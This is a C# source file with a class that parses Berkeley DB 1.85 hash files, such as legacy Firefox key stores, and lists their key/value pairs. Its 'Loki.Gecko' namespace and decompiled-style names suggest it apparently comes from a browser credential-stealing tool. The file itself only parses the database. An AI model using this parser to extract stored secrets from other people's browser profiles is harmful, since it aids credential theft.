namespace Loki.Gecko
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Text;

    public class BerkeleyDB
    {
        public string Version { get; set; }
        public List<KeyValuePair<string, string>> Keys { get; private set; }

        public BerkeleyDB(string FileName)
        {
            var entire = new List<byte>();
            this.Keys = new List<KeyValuePair<string, string>>();
            using (var binaryReader = new BinaryReader(File.OpenRead(FileName)))
            {
                int i = 0;
                for (int num = (int)binaryReader.BaseStream.Length; i < num; i++)
                {
                    entire.Add(binaryReader.ReadByte());
                }
            }
            string value = BitConverter.ToString(Extract(entire.ToArray(), 0, 4, littleEndian: false)).Replace("-", "");
            string text = BitConverter.ToString(Extract(entire.ToArray(), 4, 4, littleEndian: false)).Replace("-", "");
            int num2 = BitConverter.ToInt32(Extract(entire.ToArray(), 12, 4, littleEndian: true), 0);
            if (!string.IsNullOrEmpty(value))
            {
                this.Version = "Berkelet DB";
                if (text.Equals("00000002"))
                {
                    this.Version += " 1.85 (Hash, version 2, native byte-order)";
                }
                int num3 = int.Parse(BitConverter.ToString(Extract(entire.ToArray(), 56, 4, littleEndian: false)).Replace("-", ""));
                int num4 = 1;
                while (this.Keys.Count < num3)
                {
                    string[] array = new string[(num3 - this.Keys.Count) * 2];
                    for (int j = 0; j < (num3 - this.Keys.Count) * 2; j++)
                    {
                        array[j] = BitConverter.ToString(Extract(entire.ToArray(), num2 * num4 + 2 + j * 2, 2, littleEndian: true)).Replace("-", "");
                    }
                    Array.Sort(array);
                    for (int k = 0; k < array.Length; k += 2)
                    {
                        int num5 = Convert.ToInt32(array[k], 16) + num2 * num4;
                        int num6 = Convert.ToInt32(array[k + 1], 16) + num2 * num4;
                        int num7 = (k + 2 >= array.Length) ? (num2 + num2 * num4) : (Convert.ToInt32(array[k + 2], 16) + num2 * num4);
                        string @string = Encoding.ASCII.GetString(Extract(entire.ToArray(), num6, num7 - num6, littleEndian: false));
                        string value2 = BitConverter.ToString(Extract(entire.ToArray(), num5, num6 - num5, littleEndian: false));
                        if (!string.IsNullOrEmpty(@string))
                        {
                            this.Keys.Add(new KeyValuePair<string, string>(@string, value2));
                        }
                    }
                    num4++;
                }
            }
            else
            {
                this.Version = "Unknow database format";
            }
        }

        private byte[] Extract(byte[] source, int start, int length, bool littleEndian)
        {
            byte[] array = new byte[length];
            int num = 0;
            for (int i = start; i < start + length; i++)
            {
                array[num] = source[i];
                num++;
            }
            if (littleEndian)
            {
                Array.Reverse(array);
            }
            return array;
        }
    }
}
